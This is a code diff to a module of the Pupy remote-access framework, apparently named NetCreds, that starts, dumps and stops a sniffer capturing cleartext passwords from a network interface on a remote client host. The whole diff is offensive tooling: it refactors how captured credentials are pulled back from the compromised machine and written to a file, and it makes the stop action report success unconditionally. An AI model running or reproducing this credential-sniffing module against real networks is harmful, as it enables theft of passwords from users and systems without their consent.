@@ -2,7 +2,7 @@
 # Thanks to Dan McInerney for its net-creds project
 # Github: https://github.com/DanMcInerney/net-creds
 from pupylib.PupyModule import *
-from pupylib.utils.rpyc_utils import redirected_stdio
+from pupylib.utils.rpyc_utils import obtain
 import os
 import datetime
 
@@ -13,9 +13,8 @@ class NetCreds(PupyModule):
     """
         Sniffs cleartext passwords from interface
     """
-    daemon = True
     unique_instance = True
-    dependencies=[ 'scapy', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds' ]
+    dependencies=[ 'netifaces', 'scapy', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds' ]
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='netcreds', description=self.__doc__)
@@ -25,14 +24,13 @@ class NetCreds(PupyModule):
 
     def run(self, args):
         if args.action=="start":
-            with redirected_stdio(self): #to see the output exception in case of error
-                r = self.client.conn.modules["pupyutils.netcreds"].netcreds_start(args.interface, args.filterip)
-                if r == 'not_root':
-                    self.error("Needs root privileges to be started")
-                elif not r:
-                    self.error("Network credentials sniffer is already started")
-                else:
-                    self.success("Network credentials sniffer started !")
+            r = self.client.conn.modules["pupyutils.netcreds"].netcreds_start(args.interface, args.filterip)
+            if r == 'not_root':
+                self.error("Needs root privileges to be started")
+            elif not r:
+                self.error("Network credentials sniffer is already started")
+            else:
+                self.success("Network credentials sniffer started !")
 
         elif args.action=="dump":
             try:
@@ -40,13 +38,18 @@ class NetCreds(PupyModule):
             except Exception:
                 pass
 
-            data=self.client.conn.modules["pupyutils.netcreds"].netcreds_dump()
+            data = obtain(self.client.conn.modules["pupyutils.netcreds"].netcreds_dump())
 
             if data is None:
                 self.error("Network credentials sniffer has not been started yet")
+
             elif not data:
                 self.warning("No network credentials recorded")
+
             else:
+                data = '\n'.join(data)
+                data += '\n'
+
                 # remove color before writting into the file
                 W = '\033[0m'  # white (normal)
                 T = '\033[93m'  # tan
@@ -60,7 +63,4 @@ class NetCreds(PupyModule):
 
         elif args.action=="stop":
             stop = self.client.conn.modules["pupyutils.netcreds"].netcreds_stop()
-            if stop:
-                self.success("Network credentials sniffer is stopped")
-            else:
-                self.error("Network credentials sniffer has not been started yet")
+            self.success("Network credentials sniffer is stopped")
